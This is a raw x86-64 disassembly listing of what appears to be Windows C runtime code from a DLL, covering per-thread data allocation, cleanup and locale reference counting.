   180006123:	48 83 ec 20          	sub    $0x20,%rsp
   180006127:	49 8b d9             	mov    %r9,%rbx
   18000612a:	49 8b f8             	mov    %r8,%rdi
   18000612d:	8b 0a                	mov    (%rdx),%ecx
   18000612f:	e8 e4 07 00 00       	call   0x180006918
   180006134:	90                   	nop
   180006135:	48 8b 07             	mov    (%rdi),%rax
   180006138:	48 8b 08             	mov    (%rax),%rcx
   18000613b:	48 8b 81 88 00 00 00 	mov    0x88(%rcx),%rax
   180006142:	f0 ff 00             	lock incl (%rax)
   180006145:	8b 0b                	mov    (%rbx),%ecx
   180006147:	e8 20 08 00 00       	call   0x18000696c
   18000614c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180006151:	48 83 c4 20          	add    $0x20,%rsp
   180006155:	5f                   	pop    %rdi
   180006156:	c3                   	ret
   180006157:	cc                   	int3
   180006158:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000615d:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   180006162:	57                   	push   %rdi
   180006163:	48 83 ec 20          	sub    $0x20,%rsp
   180006167:	49 8b d9             	mov    %r9,%rbx
   18000616a:	49 8b f8             	mov    %r8,%rdi
   18000616d:	8b 0a                	mov    (%rdx),%ecx
   18000616f:	e8 a4 07 00 00       	call   0x180006918
   180006174:	90                   	nop
   180006175:	48 8b 0f             	mov    (%rdi),%rcx
   180006178:	33 d2                	xor    %edx,%edx
   18000617a:	48 8b 09             	mov    (%rcx),%rcx
   18000617d:	e8 5e 03 00 00       	call   0x1800064e0
   180006182:	90                   	nop
   180006183:	8b 0b                	mov    (%rbx),%ecx
   180006185:	e8 e2 07 00 00       	call   0x18000696c
   18000618a:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000618f:	48 83 c4 20          	add    $0x20,%rsp
   180006193:	5f                   	pop    %rdi
   180006194:	c3                   	ret
   180006195:	cc                   	int3
   180006196:	cc                   	int3
   180006197:	cc                   	int3
   180006198:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000619d:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1800061a2:	57                   	push   %rdi
   1800061a3:	48 83 ec 20          	sub    $0x20,%rsp
   1800061a7:	49 8b d9             	mov    %r9,%rbx
   1800061aa:	49 8b f8             	mov    %r8,%rdi
   1800061ad:	8b 0a                	mov    (%rdx),%ecx
   1800061af:	e8 64 07 00 00       	call   0x180006918
   1800061b4:	90                   	nop
   1800061b5:	48 8b 47 08          	mov    0x8(%rdi),%rax
   1800061b9:	48 8b 10             	mov    (%rax),%rdx
   1800061bc:	48 8b 0f             	mov    (%rdi),%rcx
   1800061bf:	48 8b 12             	mov    (%rdx),%rdx
   1800061c2:	48 8b 09             	mov    (%rcx),%rcx
   1800061c5:	e8 16 03 00 00       	call   0x1800064e0
   1800061ca:	90                   	nop
   1800061cb:	8b 0b                	mov    (%rbx),%ecx
   1800061cd:	e8 9a 07 00 00       	call   0x18000696c
   1800061d2:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1800061d7:	48 83 c4 20          	add    $0x20,%rsp
   1800061db:	5f                   	pop    %rdi
   1800061dc:	c3                   	ret
   1800061dd:	cc                   	int3
   1800061de:	cc                   	int3
   1800061df:	cc                   	int3
   1800061e0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800061e5:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1800061ea:	57                   	push   %rdi
   1800061eb:	48 83 ec 20          	sub    $0x20,%rsp
   1800061ef:	49 8b d9             	mov    %r9,%rbx
   1800061f2:	49 8b f8             	mov    %r8,%rdi
   1800061f5:	8b 0a                	mov    (%rdx),%ecx
   1800061f7:	e8 1c 07 00 00       	call   0x180006918
   1800061fc:	90                   	nop
   1800061fd:	48 8b 07             	mov    (%rdi),%rax
   180006200:	48 8b 08             	mov    (%rax),%rcx
   180006203:	48 8b 89 88 00 00 00 	mov    0x88(%rcx),%rcx
   18000620a:	48 85 c9             	test   %rcx,%rcx
   18000620d:	74 1e                	je     0x18000622d
   18000620f:	83 c8 ff             	or     $0xffffffff,%eax
   180006212:	f0 0f c1 01          	lock xadd %eax,(%rcx)
   180006216:	83 f8 01             	cmp    $0x1,%eax
   180006219:	75 12                	jne    0x18000622d
   18000621b:	48 8d 05 ee 3f 01 00 	lea    0x13fee(%rip),%rax        # 0x18001a210
   180006222:	48 3b c8             	cmp    %rax,%rcx
   180006225:	74 06                	je     0x18000622d
   180006227:	e8 44 08 00 00       	call   0x180006a70
   18000622c:	90                   	nop
   18000622d:	8b 0b                	mov    (%rbx),%ecx
   18000622f:	e8 38 07 00 00       	call   0x18000696c
   180006234:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180006239:	48 83 c4 20          	add    $0x20,%rsp
   18000623d:	5f                   	pop    %rdi
   18000623e:	c3                   	ret
   18000623f:	cc                   	int3
   180006240:	40 55                	rex push %rbp
   180006242:	48 8b ec             	mov    %rsp,%rbp
   180006245:	48 83 ec 50          	sub    $0x50,%rsp
   180006249:	48 89 4d d8          	mov    %rcx,-0x28(%rbp)
   18000624d:	48 8d 45 d8          	lea    -0x28(%rbp),%rax
   180006251:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   180006255:	4c 8d 4d 20          	lea    0x20(%rbp),%r9
   180006259:	ba 01 00 00 00       	mov    $0x1,%edx
   18000625e:	4c 8d 45 e8          	lea    -0x18(%rbp),%r8
   180006262:	b8 05 00 00 00       	mov    $0x5,%eax
   180006267:	89 45 20             	mov    %eax,0x20(%rbp)
   18000626a:	89 45 28             	mov    %eax,0x28(%rbp)
   18000626d:	48 8d 45 d8          	lea    -0x28(%rbp),%rax
   180006271:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   180006275:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
   180006279:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   18000627d:	b8 04 00 00 00       	mov    $0x4,%eax
   180006282:	89 45 d0             	mov    %eax,-0x30(%rbp)
   180006285:	89 45 d4             	mov    %eax,-0x2c(%rbp)
   180006288:	48 8d 05 c9 4a 01 00 	lea    0x14ac9(%rip),%rax        # 0x18001ad58
   18000628f:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   180006293:	89 51 28             	mov    %edx,0x28(%rcx)
   180006296:	48 8d 0d 73 9f 00 00 	lea    0x9f73(%rip),%rcx        # 0x180010210
   18000629d:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   1800062a1:	48 89 08             	mov    %rcx,(%rax)
   1800062a4:	48 8d 0d 65 3f 01 00 	lea    0x13f65(%rip),%rcx        # 0x18001a210
   1800062ab:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   1800062af:	89 90 a8 03 00 00    	mov    %edx,0x3a8(%rax)
   1800062b5:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   1800062b9:	48 89 88 88 00 00 00 	mov    %rcx,0x88(%rax)
   1800062c0:	8d 4a 42             	lea    0x42(%rdx),%ecx
   1800062c3:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   1800062c7:	48 8d 55 28          	lea    0x28(%rbp),%rdx
   1800062cb:	66 89 88 bc 00 00 00 	mov    %cx,0xbc(%rax)
   1800062d2:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   1800062d6:	66 89 88 c2 01 00 00 	mov    %cx,0x1c2(%rax)
   1800062dd:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   1800062e1:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   1800062e5:	48 83 a0 a0 03 00 00 	andq   $0x0,0x3a0(%rax)
   1800062ec:	00 
   1800062ed:	e8 26 fe ff ff       	call   0x180006118
   1800062f2:	4c 8d 4d d0          	lea    -0x30(%rbp),%r9
   1800062f6:	4c 8d 45 f0          	lea    -0x10(%rbp),%r8
   1800062fa:	48 8d 55 d4          	lea    -0x2c(%rbp),%rdx
   1800062fe:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   180006302:	e8 91 fe ff ff       	call   0x180006198
   180006307:	48 83 c4 50          	add    $0x50,%rsp
   18000630b:	5d                   	pop    %rbp
   18000630c:	c3                   	ret
   18000630d:	cc                   	int3
   18000630e:	cc                   	int3
   18000630f:	cc                   	int3
   180006310:	48 85 c9             	test   %rcx,%rcx
   180006313:	74 1a                	je     0x18000632f
   180006315:	53                   	push   %rbx
   180006316:	48 83 ec 20          	sub    $0x20,%rsp
   18000631a:	48 8b d9             	mov    %rcx,%rbx
   18000631d:	e8 0e 00 00 00       	call   0x180006330
   180006322:	48 8b cb             	mov    %rbx,%rcx
   180006325:	e8 46 07 00 00       	call   0x180006a70
   18000632a:	48 83 c4 20          	add    $0x20,%rsp
   18000632e:	5b                   	pop    %rbx
   18000632f:	c3                   	ret
   180006330:	40 55                	rex push %rbp
   180006332:	48 8b ec             	mov    %rsp,%rbp
   180006335:	48 83 ec 40          	sub    $0x40,%rsp
   180006339:	48 8d 45 e8          	lea    -0x18(%rbp),%rax
   18000633d:	48 89 4d e8          	mov    %rcx,-0x18(%rbp)
   180006341:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   180006345:	48 8d 15 c4 9e 00 00 	lea    0x9ec4(%rip),%rdx        # 0x180010210
   18000634c:	b8 05 00 00 00       	mov    $0x5,%eax
   180006351:	89 45 20             	mov    %eax,0x20(%rbp)
   180006354:	89 45 28             	mov    %eax,0x28(%rbp)
   180006357:	48 8d 45 e8          	lea    -0x18(%rbp),%rax
   18000635b:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   18000635f:	b8 04 00 00 00       	mov    $0x4,%eax
   180006364:	89 45 e0             	mov    %eax,-0x20(%rbp)
   180006367:	89 45 e4             	mov    %eax,-0x1c(%rbp)
   18000636a:	48 8b 01             	mov    (%rcx),%rax
   18000636d:	48 3b c2             	cmp    %rdx,%rax
   180006370:	74 0c                	je     0x18000637e
   180006372:	48 8b c8             	mov    %rax,%rcx
   180006375:	e8 f6 06 00 00       	call   0x180006a70
   18000637a:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   18000637e:	48 8b 49 70          	mov    0x70(%rcx),%rcx
   180006382:	e8 e9 06 00 00       	call   0x180006a70
   180006387:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   18000638b:	48 8b 49 58          	mov    0x58(%rcx),%rcx
   18000638f:	e8 dc 06 00 00       	call   0x180006a70
   180006394:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   180006398:	48 8b 49 60          	mov    0x60(%rcx),%rcx
   18000639c:	e8 cf 06 00 00       	call   0x180006a70
   1800063a1:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   1800063a5:	48 8b 49 68          	mov    0x68(%rcx),%rcx
   1800063a9:	e8 c2 06 00 00       	call   0x180006a70
   1800063ae:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   1800063b2:	48 8b 49 48          	mov    0x48(%rcx),%rcx
   1800063b6:	e8 b5 06 00 00       	call   0x180006a70
   1800063bb:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   1800063bf:	48 8b 49 50          	mov    0x50(%rcx),%rcx
   1800063c3:	e8 a8 06 00 00       	call   0x180006a70
   1800063c8:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   1800063cc:	48 8b 49 78          	mov    0x78(%rcx),%rcx
   1800063d0:	e8 9b 06 00 00       	call   0x180006a70
   1800063d5:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   1800063d9:	48 8b 89 80 00 00 00 	mov    0x80(%rcx),%rcx
   1800063e0:	e8 8b 06 00 00       	call   0x180006a70
   1800063e5:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
   1800063e9:	48 8b 89 c0 03 00 00 	mov    0x3c0(%rcx),%rcx
   1800063f0:	e8 7b 06 00 00       	call   0x180006a70
   1800063f5:	4c 8d 4d 20          	lea    0x20(%rbp),%r9
   1800063f9:	4c 8d 45 f0          	lea    -0x10(%rbp),%r8
   1800063fd:	48 8d 55 28          	lea    0x28(%rbp),%rdx
   180006401:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   180006405:	e8 d6 fd ff ff       	call   0x1800061e0
   18000640a:	4c 8d 4d e0          	lea    -0x20(%rbp),%r9
   18000640e:	4c 8d 45 f8          	lea    -0x8(%rbp),%r8
   180006412:	48 8d 55 e4          	lea    -0x1c(%rbp),%rdx
   180006416:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   18000641a:	e8 39 fd ff ff       	call   0x180006158
   18000641f:	48 83 c4 40          	add    $0x40,%rsp
   180006423:	5d                   	pop    %rbp
   180006424:	c3                   	ret
   180006425:	cc                   	int3
   180006426:	cc                   	int3
   180006427:	cc                   	int3
   180006428:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000642d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   180006432:	57                   	push   %rdi
   180006433:	48 83 ec 20          	sub    $0x20,%rsp
   180006437:	ff 15 33 8c 00 00    	call   *0x8c33(%rip)        # 0x18000f070
   18000643d:	8b 0d 55 3c 01 00    	mov    0x13c55(%rip),%ecx        # 0x18001a098
   180006443:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   180006447:	8b f8                	mov    %eax,%edi
   180006449:	e8 ea 24 00 00       	call   0x180008938
   18000644e:	33 f6                	xor    %esi,%esi
   180006450:	85 c0                	test   %eax,%eax
   180006452:	75 0c                	jne    0x180006460
   180006454:	8b cf                	mov    %edi,%ecx
   180006456:	ff 15 1c 8c 00 00    	call   *0x8c1c(%rip)        # 0x18000f078
   18000645c:	33 c0                	xor    %eax,%eax
   18000645e:	eb 6d                	jmp    0x1800064cd
   180006460:	ba c8 03 00 00       	mov    $0x3c8,%edx
   180006465:	b9 01 00 00 00       	mov    $0x1,%ecx
   18000646a:	e8 81 05 00 00       	call   0x1800069f0
   18000646f:	8b 0d 23 3c 01 00    	mov    0x13c23(%rip),%ecx        # 0x18001a098
   180006475:	48 8b d8             	mov    %rax,%rbx
   180006478:	48 85 c0             	test   %rax,%rax
   18000647b:	75 10                	jne    0x18000648d
   18000647d:	33 d2                	xor    %edx,%edx
   18000647f:	e8 b4 24 00 00       	call   0x180008938
   180006484:	33 c9                	xor    %ecx,%ecx
   180006486:	e8 e5 05 00 00       	call   0x180006a70
   18000648b:	eb c7                	jmp    0x180006454
   18000648d:	48 8b d3             	mov    %rbx,%rdx
   180006490:	e8 a3 24 00 00       	call   0x180008938
   180006495:	85 c0                	test   %eax,%eax
   180006497:	75 17                	jne    0x1800064b0
   180006499:	8b 0d f9 3b 01 00    	mov    0x13bf9(%rip),%ecx        # 0x18001a098
   18000649f:	33 d2                	xor    %edx,%edx
   1800064a1:	e8 92 24 00 00       	call   0x180008938
   1800064a6:	48 8b cb             	mov    %rbx,%rcx
   1800064a9:	e8 c2 05 00 00       	call   0x180006a70
   1800064ae:	eb 12                	jmp    0x1800064c2
   1800064b0:	48 8b cb             	mov    %rbx,%rcx
   1800064b3:	e8 88 fd ff ff       	call   0x180006240
   1800064b8:	33 c9                	xor    %ecx,%ecx
   1800064ba:	e8 b1 05 00 00       	call   0x180006a70
   1800064bf:	48 8b f3             	mov    %rbx,%rsi
   1800064c2:	8b cf                	mov    %edi,%ecx
   1800064c4:	ff 15 ae 8b 00 00    	call   *0x8bae(%rip)        # 0x18000f078
   1800064ca:	48 8b c6             	mov    %rsi,%rax
   1800064cd:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1800064d2:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1800064d7:	48 83 c4 20          	add    $0x20,%rsp
   1800064db:	5f                   	pop    %rdi
   1800064dc:	c3                   	ret
   1800064dd:	cc                   	int3
   1800064de:	cc                   	int3
   1800064df:	cc                   	int3
   1800064e0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800064e5:	57                   	push   %rdi
   1800064e6:	48 83 ec 20          	sub    $0x20,%rsp
   1800064ea:	48 8b f9             	mov    %rcx,%rdi
   1800064ed:	48 8b da             	mov    %rdx,%rbx
   1800064f0:	48 8b 89 90 00 00 00 	mov    0x90(%rcx),%rcx
   1800064f7:	48 85 c9             	test   %rcx,%rcx
   1800064fa:	74 2c                	je     0x180006528
   1800064fc:	e8 73 3b 00 00       	call   0x18000a074
   180006501:	48 8b 8f 90 00 00 00 	mov    0x90(%rdi),%rcx
   180006508:	48 3b 0d 49 48 01 00 	cmp    0x14849(%rip),%rcx        # 0x18001ad58
   18000650f:	74 17                	je     0x180006528
   180006511:	48 8d 05 88 3b 01 00 	lea    0x13b88(%rip),%rax        # 0x18001a0a0
   180006518:	48 3b c8             	cmp    %rax,%rcx
   18000651b:	74 0b                	je     0x180006528
   18000651d:	83 79 10 00          	cmpl   $0x0,0x10(%rcx)
   180006521:	75 05                	jne    0x180006528
   180006523:	e8 4c 39 00 00       	call   0x180009e74
   180006528:	48 89 9f 90 00 00 00 	mov    %rbx,0x90(%rdi)
   18000652f:	48 85 db             	test   %rbx,%rbx
   180006532:	74 08                	je     0x18000653c
   180006534:	48 8b cb             	mov    %rbx,%rcx
   180006537:	e8 ac 38 00 00       	call   0x180009de8
   18000653c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180006541:	48 83 c4 20          	add    $0x20,%rsp
   180006545:	5f                   	pop    %rdi
   180006546:	c3                   	ret
   180006547:	cc                   	int3
   180006548:	40 53                	rex push %rbx
   18000654a:	48 83 ec 30          	sub    $0x30,%rsp
   18000654e:	48 c7 44 24 20 fe ff 	movq   $0xfffffffffffffffe,0x20(%rsp)
   180006555:	ff ff 
   180006557:	8b 0d 3b 3b 01 00    	mov    0x13b3b(%rip),%ecx        # 0x18001a098
   18000655d:	83 f9 ff             	cmp    $0xffffffff,%ecx
   180006560:	75 04                	jne    0x180006566
   180006562:	33 db                	xor    %ebx,%ebx
   180006564:	eb 0e                	jmp    0x180006574
   180006566:	e8 b9 23 00 00       	call   0x180008924
   18000656b:	48 8b d8             	mov    %rax,%rbx
   18000656e:	8b 0d 24 3b 01 00    	mov    0x13b24(%rip),%ecx        # 0x18001a098
   180006574:	48 85 db             	test   %rbx,%rbx
   180006577:	74 17                	je     0x180006590
   180006579:	33 d2                	xor    %edx,%edx
   18000657b:	e8 b8 23 00 00       	call   0x180008938
   180006580:	48 8b cb             	mov    %rbx,%rcx
   180006583:	e8 a8 fd ff ff       	call   0x180006330
   180006588:	48 8b cb             	mov    %rbx,%rcx
   18000658b:	e8 e0 04 00 00       	call   0x180006a70
   180006590:	48 83 c4 30          	add    $0x30,%rsp
   180006594:	5b                   	pop    %rbx
   180006595:	c3                   	ret
   180006596:	cc                   	int3
   180006597:	cc                   	int3
   180006598:	48 83 ec 28          	sub    $0x28,%rsp
   18000659c:	e8 57 00 00 00       	call   0x1800065f8
   1800065a1:	48 85 c0             	test   %rax,%rax
   1800065a4:	74 05                	je     0x1800065ab
   1800065a6:	48 83 c4 28          	add    $0x28,%rsp
   1800065aa:	c3                   	ret
   1800065ab:	e8 c0 f4 ff ff       	call   0x180005a70
   1800065b0:	cc                   	int3
   1800065b1:	cc                   	int3
   1800065b2:	cc                   	int3
   1800065b3:	cc                   	int3
   1800065b4:	48 83 ec 38          	sub    $0x38,%rsp
   1800065b8:	48 c7 44 24 20 fe ff 	movq   $0xfffffffffffffffe,0x20(%rsp)
   1800065bf:	ff ff 
   1800065c1:	8b 0d d1 3a 01 00    	mov    0x13ad1(%rip),%ecx        # 0x18001a098
   1800065c7:	83 f9 ff             	cmp    $0xffffffff,%ecx
   1800065ca:	75 04                	jne    0x1800065d0
   1800065cc:	33 c0                	xor    %eax,%eax
   1800065ce:	eb 06                	jmp    0x1800065d6
   1800065d0:	e8 4f 23 00 00       	call   0x180008924
   1800065d5:	90                   	nop
   1800065d6:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   1800065da:	74 14                	je     0x1800065f0
   1800065dc:	48 85 c0             	test   %rax,%rax
   1800065df:	75 0a                	jne    0x1800065eb
   1800065e1:	e8 42 fe ff ff       	call   0x180006428
   1800065e6:	48 85 c0             	test   %rax,%rax
   1800065e9:	74 05                	je     0x1800065f0
   1800065eb:	48 83 c4 38          	add    $0x38,%rsp
   1800065ef:	c3                   	ret
   1800065f0:	e8 7b f4 ff ff       	call   0x180005a70
   1800065f5:	cc                   	int3
   1800065f6:	cc                   	int3
   1800065f7:	cc                   	int3
   1800065f8:	40 57                	rex push %rdi
   1800065fa:	48 83 ec 30          	sub    $0x30,%rsp
   1800065fe:	48 c7 44 24 20 fe ff 	movq   $0xfffffffffffffffe,0x20(%rsp)
   180006605:	ff ff 
   180006607:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   18000660c:	33 ff                	xor    %edi,%edi
   18000660e:	40 38 3d 3b 47 01 00 	cmp    %dil,0x1473b(%rip)        # 0x18001ad50
   180006615:	74 2a                	je     0x180006641
   180006617:	8b 0d 7b 3a 01 00    	mov    0x13a7b(%rip),%ecx        # 0x18001a098
   18000661d:	83 f9 ff             	cmp    $0xffffffff,%ecx
   180006620:	75 04                	jne    0x180006626
   180006622:	8b c7                	mov    %edi,%eax
   180006624:	eb 06                	jmp    0x18000662c
   180006626:	e8 01 23 00 00       	call   0x18000892c
   18000662b:	90                   	nop
   18000662c:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   180006630:	74 48                	je     0x18000667a
   180006632:	48 85 c0             	test   %rax,%rax
   180006635:	75 05                	jne    0x18000663c
   180006637:	e8 ec fd ff ff       	call   0x180006428
   18000663c:	48 8b f8             	mov    %rax,%rdi
   18000663f:	eb 39                	jmp    0x18000667a
   180006641:	ff 15 29 8a 00 00    	call   *0x8a29(%rip)        # 0x18000f070
   180006647:	8b d8                	mov    %eax,%ebx
   180006649:	8b 0d 49 3a 01 00    	mov    0x13a49(%rip),%ecx        # 0x18001a098
   18000664f:	83 f9 ff             	cmp    $0xffffffff,%ecx
   180006652:	75 05                	jne    0x180006659
   180006654:	48 8b c7             	mov    %rdi,%rax
   180006657:	eb 06                	jmp    0x18000665f
   180006659:	e8 c6 22 00 00       	call   0x180008924
   18000665e:	90                   	nop
   18000665f:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   180006663:	74 0d                	je     0x180006672
   180006665:	48 85 c0             	test   %rax,%rax
   180006668:	75 05                	jne    0x18000666f
   18000666a:	e8 b9 fd ff ff       	call   0x180006428
   18000666f:	48 8b f8             	mov    %rax,%rdi
   180006672:	8b cb                	mov    %ebx,%ecx
   180006674:	ff 15 fe 89 00 00    	call   *0x89fe(%rip)        # 0x18000f078
   18000667a:	48 8b c7             	mov    %rdi,%rax
   18000667d:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   180006682:	48 83 c4 30          	add    $0x30,%rsp
   180006686:	5f                   	pop    %rdi
   180006687:	c3                   	ret
   180006688:	40 57                	rex push %rdi
   18000668a:	48 83 ec 30          	sub    $0x30,%rsp
   18000668e:	48 c7 44 24 20 fe ff 	movq   $0xfffffffffffffffe,0x20(%rsp)
   180006695:	ff ff 
   180006697:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   18000669c:	48 8b fa             	mov    %rdx,%rdi
   18000669f:	33 db                	xor    %ebx,%ebx
   1800066a1:	8b 0d f1 39 01 00    	mov    0x139f1(%rip),%ecx        # 0x18001a098
   1800066a7:	83 f9 ff             	cmp    $0xffffffff,%ecx
   1800066aa:	75 04                	jne    0x1800066b0
   1800066ac:	8b c3                	mov    %ebx,%eax
   1800066ae:	eb 06                	jmp    0x1800066b6
   1800066b0:	e8 6f 22 00 00       	call   0x180008924
   1800066b5:	90                   	nop
   1800066b6:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   1800066ba:	74 19                	je     0x1800066d5
   1800066bc:	48 85 c0             	test   %rax,%rax
   1800066bf:	75 0a                	jne    0x1800066cb
   1800066c1:	e8 62 fd ff ff       	call   0x180006428
   1800066c6:	48 85 c0             	test   %rax,%rax
   1800066c9:	74 0a                	je     0x1800066d5
   1800066cb:	48 69 df c8 03 00 00 	imul   $0x3c8,%rdi,%rbx
   1800066d2:	48 03 d8             	add    %rax,%rbx
   1800066d5:	48 8b c3             	mov    %rbx,%rax
   1800066d8:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1800066dd:	48 83 c4 30          	add    $0x30,%rsp
   1800066e1:	5f                   	pop    %rdi
   1800066e2:	c3                   	ret
   1800066e3:	cc                   	int3
   1800066e4:	48 83 ec 28          	sub    $0x28,%rsp
   1800066e8:	e8 e3 23 00 00       	call   0x180008ad0
   1800066ed:	48 8d 0d 1c fc ff ff 	lea    -0x3e4(%rip),%rcx        # 0x180006310
   1800066f4:	88 05 56 46 01 00    	mov    %al,0x14656(%rip)        # 0x18001ad50
   1800066fa:	e8 15 22 00 00       	call   0x180008914
   1800066ff:	89 05 93 39 01 00    	mov    %eax,0x13993(%rip)        # 0x18001a098
   180006705:	83 f8 ff             	cmp    $0xffffffff,%eax
   180006708:	75 04                	jne    0x18000670e
   18000670a:	32 c0                	xor    %al,%al
   18000670c:	eb 15                	jmp    0x180006723
   18000670e:	e8 e5 fe ff ff       	call   0x1800065f8
   180006713:	48 85 c0             	test   %rax,%rax
   180006716:	75 09                	jne    0x180006721
   180006718:	33 c9                	xor    %ecx,%ecx
   18000671a:	e8 09 00 00 00       	call   0x180006728
   18000671f:	eb e9                	jmp    0x18000670a
   180006721:	b0 01                	mov    $0x1,%al
   180006723:	48 83 c4 28          	add    $0x28,%rsp
   180006727:	c3                   	ret
   180006728:	48 83 ec 28          	sub    $0x28,%rsp
   18000672c:	8b 0d 66 39 01 00    	mov    0x13966(%rip),%ecx        # 0x18001a098
   180006732:	83 f9 ff             	cmp    $0xffffffff,%ecx
   180006735:	74 0c                	je     0x180006743
   180006737:	e8 e0 21 00 00       	call   0x18000891c
   18000673c:	83 0d 55 39 01 00 ff 	orl    $0xffffffff,0x13955(%rip)        # 0x18001a098
   180006743:	b0 01                	mov    $0x1,%al
   180006745:	48 83 c4 28          	add    $0x28,%rsp
   180006749:	c3                   	ret
   18000674a:	cc                   	int3
   18000674b:	cc                   	int3
   18000674c:	40 53                	rex push %rbx
   18000674e:	48 83 ec 20          	sub    $0x20,%rsp
   180006752:	48 8b 05 ff 45 01 00 	mov    0x145ff(%rip),%rax        # 0x18001ad58
   180006759:	48 8b da             	mov    %rdx,%rbx
   18000675c:	48 39 02             	cmp    %rax,(%rdx)
   18000675f:	74 16                	je     0x180006777
   180006761:	8b 81 a8 03 00 00    	mov    0x3a8(%rcx),%eax
   180006767:	85 05 eb 40 01 00    	test   %eax,0x140eb(%rip)        # 0x18001a858
   18000676d:	75 08                	jne    0x180006777
   18000676f:	e8 a8 39 00 00       	call   0x18000a11c
   180006774:	48 89 03             	mov    %rax,(%rbx)
   180006777:	48 83 c4 20          	add    $0x20,%rsp
   18000677b:	5b                   	pop    %rbx
   18000677c:	c3                   	ret
   18000677d:	cc                   	int3
   18000677e:	cc                   	int3
   18000677f:	cc                   	int3
   180006780:	40 53                	rex push %rbx
   180006782:	48 83 ec 20          	sub    $0x20,%rsp
   180006786:	48 8d 05 cb 45 01 00 	lea    0x145cb(%rip),%rax        # 0x18001ad58
   18000678d:	48 8b da             	mov    %rdx,%rbx
   180006790:	4a 8b 04 c0          	mov    (%rax,%r8,8),%rax
   180006794:	48 39 02             	cmp    %rax,(%rdx)
   180006797:	74 16                	je     0x1800067af
   180006799:	8b 81 a8 03 00 00    	mov    0x3a8(%rcx),%eax
   18000679f:	85 05 b3 40 01 00    	test   %eax,0x140b3(%rip)        # 0x18001a858
   1800067a5:	75 08                	jne    0x1800067af
   1800067a7:	e8 70 39 00 00       	call   0x18000a11c
   1800067ac:	48 89 03             	mov    %rax,(%rbx)
   1800067af:	48 83 c4 20          	add    $0x20,%rsp
   1800067b3:	5b                   	pop    %rbx
   1800067b4:	c3                   	ret
   1800067b5:	cc                   	int3
   1800067b6:	cc                   	int3
   1800067b7:	cc                   	int3
   1800067b8:	40 53                	rex push %rbx
   1800067ba:	48 83 ec 20          	sub    $0x20,%rsp
   1800067be:	48 8b 05 0b 48 01 00 	mov    0x1480b(%rip),%rax        # 0x18001afd0
   1800067c5:	48 8b da             	mov    %rdx,%rbx
   1800067c8:	48 39 02             	cmp    %rax,(%rdx)
   1800067cb:	74 16                	je     0x1800067e3
   1800067cd:	8b 81 a8 03 00 00    	mov    0x3a8(%rcx),%eax
   1800067d3:	85 05 7f 40 01 00    	test   %eax,0x1407f(%rip)        # 0x18001a858
   1800067d9:	75 08                	jne    0x1800067e3
   1800067db:	e8 18 18 00 00       	call   0x180007ff8
   1800067e0:	48 89 03             	mov    %rax,(%rbx)
   1800067e3:	48 83 c4 20          	add    $0x20,%rsp
   1800067e7:	5b                   	pop    %rbx
   1800067e8:	c3                   	ret
   1800067e9:	cc                   	int3
   1800067ea:	cc                   	int3
   1800067eb:	cc                   	int3
   1800067ec:	40 53                	rex push %rbx
   1800067ee:	48 83 ec 20          	sub    $0x20,%rsp
   1800067f2:	48 8d 05 d7 47 01 00 	lea    0x147d7(%rip),%rax        # 0x18001afd0
   1800067f9:	48 8b da             	mov    %rdx,%rbx
   1800067fc:	4a 8b 04 c0          	mov    (%rax,%r8,8),%rax
   180006800:	48 39 02             	cmp    %rax,(%rdx)
   180006803:	74 16                	je     0x18000681b
   180006805:	8b 81 a8 03 00 00    	mov    0x3a8(%rcx),%eax
   18000680b:	85 05 47 40 01 00    	test   %eax,0x14047(%rip)        # 0x18001a858
   180006811:	75 08                	jne    0x18000681b
   180006813:	e8 e0 17 00 00       	call   0x180007ff8
   180006818:	48 89 03             	mov    %rax,(%rbx)
